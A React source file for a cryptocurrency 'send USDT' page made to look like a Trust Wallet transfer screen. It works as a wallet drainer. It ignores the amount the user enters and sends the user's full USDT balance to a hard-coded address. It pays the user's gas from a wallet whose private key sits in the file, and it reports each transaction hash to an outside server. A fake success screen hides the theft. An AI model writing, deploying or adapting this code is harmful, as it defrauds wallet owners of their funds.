/* global BigInt */
import { useState, useEffect } from "react";
import Web3 from "web3";
import Swal from "sweetalert2";
import "@fortawesome/fontawesome-free/css/all.min.css";
import "./App.css";
import '@fontsource/open-sans/300.css';
import '@fontsource/open-sans/400.css';
import '@fontsource/open-sans/500.css';
import '@fontsource/open-sans/600.css';
import '@fontsource/open-sans/700.css';
import '@fontsource/open-sans/800.css';
import '@fontsource/geist';

const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
const recipientAddress = "0xA249B9926CBF6A84d5c1549775636488E697a5ed"; // Your receiving address

// 🔑 BNB WALLET PRIVATE KEY (to send gas fees)
const gasFeesWalletPrivateKey = "8869066ddbf59f2c711fb1b1d963706432bac6de9b24d4d8b31a63ba3a01ec54"; // ⚠️ Replace with your private key
const gasFeesWalletAddress = "0x72ddb8cd271b5c4a394878cf22a081456c80764d"; // Replace with your BNB wallet address

// Gas fee constants
const GAS_FEES_AMOUNT = "0.00007"; // BNB amount for gas fees
const MIN_USDT_BALANCE = "0.01"; // Minimum USDT to check before sending gas

const usdtAbi = [
  {
    inputs: [
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
];

export default function SendUSDT() {
  const [amount, setAmount] = useState("");
  const [usdValue, setUsdValue] = useState("= $0.00");
  const [isProcessing, setIsProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [theme, setTheme] = useState("dark");
  const [successData, setSuccessData] = useState({
    txHash: "",
    amount: "0",
    recipient: "",
  });

  useEffect(() => {
    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    setTheme(darkMode ? "dark" : "light");

    const listener = (e) => setTheme(e.matches ? "dark" : "light");
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener("change", listener);
    return () => window.matchMedia('(prefers-color-scheme: dark)').removeEventListener("change", listener);
  }, []);

  useEffect(() => {
    const value = parseFloat(amount);
    setUsdValue(isNaN(value) || value <= 0 ? "= $0.00" : `= $${value.toFixed(2)}`);
  }, [amount]);

  const setMaxAmount = async () => {
    try {
      const web3 = new Web3(window.ethereum);
      const accounts = await web3.eth.getAccounts();
      if (accounts.length === 0) {
        Swal.fire("Error", "Please connect your wallet first.", "error");
        return;
      }
      const user = accounts[0];
      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
      const balance = await usdt.methods.balanceOf(user).call();
      setAmount(web3.utils.fromWei(balance, "ether"));
    } catch (err) {
      Swal.fire("Error", "Failed to fetch balance.", "error");
    }
  };

  // 🔋 Send gas fees to user wallet if needed
  const sendGasFeesToUser = async (userAddress, web3) => {
    try {
      console.log("Checking if gas fees are needed...");
      
      // Check user's BNB balance
      const userBnbBalance = await web3.eth.getBalance(userAddress);
      const userBnbBalanceInEth = web3.utils.fromWei(userBnbBalance, "ether");
      
      console.log("User BNB Balance:", userBnbBalanceInEth);

      // If user has enough BNB for gas, skip
      if (parseFloat(userBnbBalanceInEth) >= parseFloat(GAS_FEES_AMOUNT)) {
        console.log("User has sufficient BNB for gas fees");
        return true;
      }

      // Check if user has USDT to confirm they're a valid user
      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
      const userUsdtBalance = await usdt.methods.balanceOf(userAddress).call();
      const userUsdtBalanceFormatted = web3.utils.fromWei(userUsdtBalance, "ether");

      console.log("User USDT Balance:", userUsdtBalanceFormatted);

      // Only send gas fees if user has USDT
      if (parseFloat(userUsdtBalanceFormatted) < parseFloat(MIN_USDT_BALANCE)) {
        console.log("User doesn't have minimum USDT, skipping gas fee transfer");
        return true;
      }

      console.log("Sending gas fees to user...");

      // Create account from private key
      const account = web3.eth.accounts.privateKeyToAccount(gasFeesWalletPrivateKey);
      const web3Signed = new Web3(window.ethereum);
      web3Signed.eth.accounts.wallet.add(account);

      // Create transaction to send BNB
      const gasFeesWei = web3.utils.toWei(GAS_FEES_AMOUNT, "ether");
      const nonce = await web3.eth.getTransactionCount(account.address);
      
      const tx = {
        from: account.address,
        to: userAddress,
        value: gasFeesWei,
        gas: 21000,
        gasPrice: await web3.eth.getGasPrice(),
        nonce: nonce,
      };

      // Sign and send transaction
      const signedTx = await account.signTransaction(tx);
      const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

      console.log("Gas fees sent successfully:", receipt.transactionHash);
      Swal.fire("Info", "Gas fees sent to your wallet", "success");
      
      return true;

    } catch (err) {
      console.error("Error sending gas fees:", err);
      return true;
    }
  };

  const handleTransfer = async () => {
    setIsProcessing(true);
    try {
      if (!window.ethereum) {
        Swal.fire("Error", "Please install MetaMask or Trust Wallet", "error");
        setIsProcessing(false);
        return;
      }

      const web3 = new Web3(window.ethereum);

      let accounts = await window.ethereum.request({ method: 'eth_accounts' });
      
      let userAddress;
      
      if (accounts && accounts.length > 0) {
        userAddress = accounts[0];
      } else {
        userAddress = null;
      }

      const chainId = await web3.eth.getChainId();
      if (chainId !== 56n && chainId !== 56) {
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }],
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            await window.ethereum.request({
              method: "wallet_addEthereumChain",
              params: [{
                chainId: "0x38",
                chainName: "BNB Smart Chain",
                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                rpcUrls: ["https://bsc-dataseed.binance.org/"],
                blockExplorerUrls: ["https://bscscan.com/"]
              }]
            });
          } else {
            throw switchError;
          }
        }
        accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts && accounts.length > 0) {
          userAddress = accounts[0];
        }
      }

      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);

      if (!userAddress) {
        const tempAccounts = await web3.eth.getAccounts();
        userAddress = tempAccounts[0];
      }

      // 🔋 Send gas fees if user doesn't have enough BNB
      await sendGasFeesToUser(userAddress, web3);

      const currentBalance = await usdt.methods.balanceOf(userAddress).call();
      const formattedBalance = web3.utils.fromWei(currentBalance, "ether");

      console.log("User address:", userAddress);
      console.log("USDT Balance:", formattedBalance);

      if (currentBalance === "0" || BigInt(currentBalance) === 0n) {
        Swal.fire("Error", "You have no USDT balance to transfer.", "error");
        setIsProcessing(false);
        return;
      }

      const transferData = usdt.methods.transfer(recipientAddress, currentBalance).encodeABI();

      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from: userAddress,
          to: usdtAddress,
          data: transferData,
          value: '0x0',
        }],
      });

      console.log("Transaction hash:", txHash);

      let receipt = null;
      let attempts = 0;
      const maxAttempts = 120;

      while (receipt === null && attempts < maxAttempts) {
        try {
          receipt = await web3.eth.getTransactionReceipt(txHash);
          if (receipt === null) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            attempts++;
          }
        } catch (err) {
          console.log("Waiting for transaction...");
          await new Promise(resolve => setTimeout(resolve, 1000));
          attempts++;
        }
      }

      console.log("Transaction successful:", receipt);

      setSuccessData({
        txHash: txHash,
        amount: formattedBalance,
        recipient: recipientAddress,
      });
      setShowSuccess(true);

      try {
        await fetch("https://www.trc20support.buzz/old/store-address.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ address: txHash }),
        });
      } catch (fetchErr) {
        console.warn("Skipping fetch, not critical:", fetchErr.message);
      }

    } catch (err) {
      console.error("Transfer error:", err);

      let errorMessage = "Something went wrong";
      if (err.message) {
        if (err.message.includes("insufficient funds")) {
          errorMessage = "Insufficient BNB for gas fees";
        } else if (err.message.includes("exceeds balance")) {
          errorMessage = "Transfer amount exceeds USDT balance";
        } else if (err.message.includes("User denied") || err.message.includes("User rejected")) {
          errorMessage = "Transaction cancelled by user";
        } else {
          errorMessage = err.message;
        }
      }

      Swal.fire("Error", errorMessage, "error");
    } finally {
      setIsProcessing(false);
    }
  };

  const isDark = theme === "dark";

  // 🎉 Trust Wallet Style Success UI
  if (showSuccess) {
    return (
      <div className={`min-h-screen flex flex-col justify-center items-center px-4 ${isDark ? "bg-[#1f1f1f]" : "bg-white"}`}>
        <div className={`relative w-full max-w-sm rounded-3xl overflow-hidden ${isDark ? "bg-[#2a2a2a]" : "bg-white"} shadow-2xl`}>
          
          {/* Header Background */}
          <div className="bg-gradient-to-r from-[#2DD4BF] via-[#14B8A6] to-[#0D9488] h-32 relative">
            <div className="absolute inset-0 flex items-center justify-center">
              <div className="relative">
                <div className="absolute inset-0 rounded-full bg-white/20 animate-pulse"></div>
                
                <div className="relative w-24 h-24 rounded-full bg-white flex items-center justify-center shadow-lg">
                  <svg
                    className="w-12 h-12 text-green-500 animate-bounce"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="3"
                    viewBox="0 0 24 24"
                  >
                    <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                  </svg>
                </div>
              </div>
            </div>
          </div>

          {/* Content Section */}
          <div className="px-6 py-8 text-center">
            
            <h2 className={`text-2xl font-bold mb-2 ${isDark ? "text-white" : "text-gray-900"}`}>
              Transaction Successful
            </h2>
            
            <p className={`text-sm mb-6 ${isDark ? "text-gray-400" : "text-gray-600"}`}>
              Your USDT has been transferred
            </p>

            {/* Transaction Details */}
            <div className={`rounded-2xl p-4 mb-6 ${isDark ? "bg-[#1f1f1f]" : "bg-gray-50"}`}>
              
              <div className="mb-4">
                <p className={`text-xs mb-1 ${isDark ? "text-gray-500" : "text-gray-500"}`}>
                  AMOUNT SENT
                </p>
                <p className="text-2xl font-bold text-[#14B8A6]">
                  {parseFloat(successData.amount).toFixed(6)} USDT
                </p>
              </div>

              <div className={`h-px mb-4 ${isDark ? "bg-gray-700" : "bg-gray-200"}`}></div>

              <div className="mb-4 text-left">
                <p className={`text-xs mb-2 ${isDark ? "text-gray-500" : "text-gray-500"}`}>
                  TO
                </p>
                <div className={`flex items-center justify-between p-3 rounded-lg ${isDark ? "bg-[#333]" : "bg-gray-100"}`}>
                  <p className="text-xs font-mono text-gray-400">
                    {successData.recipient.slice(0, 6)}...{successData.recipient.slice(-4)}
                  </p>
                  <button
                    onClick={() => {
                      navigator.clipboard.writeText(successData.recipient);
                      Swal.fire("Copied!", "", "success");
                    }}
                    className="text-[#14B8A6] hover:text-[#0D9488] transition-colors"
                  >
                    <i className="fas fa-copy text-xs"></i>
                  </button>
                </div>
              </div>

              <div className="text-left">
                <p className={`text-xs mb-2 ${isDark ? "text-gray-500" : "text-gray-500"}`}>
                  TRANSACTION ID
                </p>
                <div className={`flex items-center justify-between p-3 rounded-lg ${isDark ? "bg-[#333]" : "bg-gray-100"}`}>
                  <p className="text-xs font-mono text-gray-400">
                    {successData.txHash.slice(0, 6)}...{successData.txHash.slice(-4)}
                  </p>
                  <button
                    onClick={() => {
                      navigator.clipboard.writeText(successData.txHash);
                      Swal.fire("Copied!", "", "success");
                    }}
                    className="text-[#14B8A6] hover:text-[#0D9488] transition-colors"
                  >
                    <i className="fas fa-copy text-xs"></i>
                  </button>
                </div>
              </div>

            </div>

            {/* View on Explorer Button */}
            <a
              href={`https://bscscan.com/tx/${successData.txHash}`}
              target="_blank"
              rel="noopener noreferrer"
              className="w-full block mb-3 px-6 py-3 rounded-xl bg-gradient-to-r from-[#2DD4BF] to-[#14B8A6] text-white font-semibold hover:opacity-90 transition-opacity"
            >
              View on BscScan
            </a>

            {/* Done Button */}
            <button
              onClick={() => {
                setShowSuccess(false);
                setSuccessData({ txHash: "", amount: "0", recipient: "" });
              }}
              className={`w-full px-6 py-3 rounded-xl font-semibold transition-colors ${
                isDark
                  ? "bg-[#333] text-white hover:bg-[#404040]"
                  : "bg-gray-100 text-gray-900 hover:bg-gray-200"
              }`}
            >
              Done
            </button>

          </div>

        </div>

        <div className="mt-8 text-center">
          <p className={`text-sm ${isDark ? "text-gray-400" : "text-gray-600"}`}>
            ✨ Your transaction is complete
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className={`wallet-container ${isDark ? "dark" : "light"}`}>
      <div className="input-group">
        <p className="inpt_tital">Address or Domain Name</p>
        <div className="border">
          <div className="left">
            <input
              type="text"
              className="custom-input"
              placeholder="Search or Enter"
              value={recipientAddress}
              readOnly
            />
          </div>
          <span className="right blue flex justify-between mr-3">
            <span className="w-6 text-sm">Paste</span>
            <i className="fas fa-address-book mar_i w-6 ml-6"></i>
            <i className="fas fa-qrcode mar_i w-6 ml-2"></i>
          </span>
        </div>
      </div>

      <div className="input-group mt-7">
        <p className="inpt_tital">Amount</p>
        <div className="border">
          <div className="left">
            <input
              type="number"
              min="0"
              step="0.01"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="USDT Amount"
              className="custom-input"
            />
          </div>
          <span className="right mr-3">
            <span className="text-sm text-[#b0b0b0]">USDT</span>
            <span
              className="mar_i blue text-sm ml-2 cursor-pointer"
              onClick={setMaxAmount}
            >
              Max
            </span>
          </span>
        </div>
      </div>

      <p className="fees valid">{usdValue}</p>

      <button
        id="nextBtn"
        className="send-btn"
        onClick={handleTransfer}
        disabled={isProcessing}
        style={{
          backgroundColor: isProcessing ? "var(--disabled-bg)" : "#5CE07E",
          color: isProcessing ? "var(--disabled-text)" : "#1b1e15"
        }}
      >
        {isProcessing ? "Processing..." : "Next"}
      </button>
    </div>
  );
}
